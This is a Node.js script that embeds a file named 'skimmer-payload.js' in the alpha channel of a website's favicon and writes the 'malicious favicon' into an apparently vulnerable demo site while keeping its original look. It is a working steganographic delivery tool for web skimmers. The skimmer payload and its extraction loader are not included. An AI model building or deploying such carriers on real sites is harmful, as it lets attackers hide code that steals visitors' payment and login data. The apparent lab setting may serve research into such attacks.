const fs = require('fs');
const path = require('path');
const { PNG } = require('pngjs');
const decodeIco = require('decode-ico');
const ICO = require('png-to-ico');

// Configuration
const PAYLOAD_FILE = path.join(__dirname, 'skimmer-payload.js');
const SOURCE_ICON = path.join(__dirname, 'original-favicon.ico');
const OUTPUT_ICON = path.join(__dirname, '../../vulnerable-site/original-favicon.ico');

// Minimum output size to fit payload (pixels = width * height >= payload length)
const MIN_SIZE = 48; // 48x48 = 2304 pixels, plenty for a ~1400 char payload

// Read payload
const payload = fs.readFileSync(PAYLOAD_FILE, 'utf8');
console.log(`[+] Payload size: ${payload.length} bytes`);

// Read and decode the original favicon
const icoBuffer = fs.readFileSync(SOURCE_ICON);
const images = decodeIco(icoBuffer);

console.log(`[+] Original favicon contains ${images.length} image(s):`);
images.forEach((img, i) => console.log(`    [${i}] ${img.width}x${img.height}`));

// Use the largest image as source
const source = images.reduce((best, img) => img.width >= best.width ? img : best, images[0]);
const srcW = source.width;
const srcH = source.height;

// Determine output size — scale up if needed to fit payload
let outW = srcW;
let outH = srcH;
if (outW * outH < payload.length + 1) {
    outW = MIN_SIZE;
    outH = MIN_SIZE;
    console.log(`[*] Scaling up from ${srcW}x${srcH} to ${outW}x${outH} to fit payload`);
}

const totalPixels = outW * outH;
console.log(`[+] Output: ${outW}x${outH} (${totalPixels} pixel capacity for ${payload.length} chars)`);

// Create output PNG
const png = new PNG({ width: outW, height: outH, filterType: -1 });

// Copy pixels from source, using nearest-neighbor scaling if sizes differ
for (let y = 0; y < outH; y++) {
    for (let x = 0; x < outW; x++) {
        const outIdx = (outW * y + x) << 2;

        // Map output pixel back to source pixel (nearest neighbor)
        const srcX = Math.floor(x * srcW / outW);
        const srcY = Math.floor(y * srcH / outH);
        const srcIdx = (srcW * srcY + srcX) << 2;

        // Copy R, G, B from original
        png.data[outIdx] = source.data[srcIdx];         // R
        png.data[outIdx + 1] = source.data[srcIdx + 1]; // G
        png.data[outIdx + 2] = source.data[srcIdx + 2]; // B
        png.data[outIdx + 3] = source.data[srcIdx + 3]; // A (will be overwritten below)
    }
}

console.log('[*] Original pixels loaded. Embedding payload into Alpha channel...');

const payloadBuffer = Buffer.from(payload, 'utf8');
console.log(`[+] Payload buffer size: ${payloadBuffer.length} bytes`);

// Embed payload into Alpha channel
let dataIdx = 0;
for (let y = 0; y < outH; y++) {
    for (let x = 0; x < outW; x++) {
        const pixelIdx = (outW * y + x) << 2;

        if (dataIdx < payloadBuffer.length) {
            png.data[pixelIdx + 3] = payloadBuffer[dataIdx];
            dataIdx++;
        } else {
            // Null terminator
            png.data[pixelIdx + 3] = 0;
            break;
        }
    }
    if (dataIdx >= payloadBuffer.length) break;
}

console.log(`[+] Embedded ${dataIdx} characters (R, G, B preserved from original)`);

// Save intermediate PNG for inspection
const buffer = PNG.sync.write(png);
fs.writeFileSync(path.join(__dirname, 'stego.png'), buffer);
console.log('[+] Intermediate PNG saved: stego.png');

// Convert to ICO and save
ICO([buffer])
    .then(buf => {
        fs.writeFileSync(OUTPUT_ICON, buf);
        console.log(`[+] Malicious favicon created at: ${OUTPUT_ICON}`);
        console.log('[+] Done! Payload hidden in Alpha channel, original appearance preserved.');
    })
    .catch(err => {
        console.error('[-] ICO conversion failed:', err);
        process.exit(1);
    });
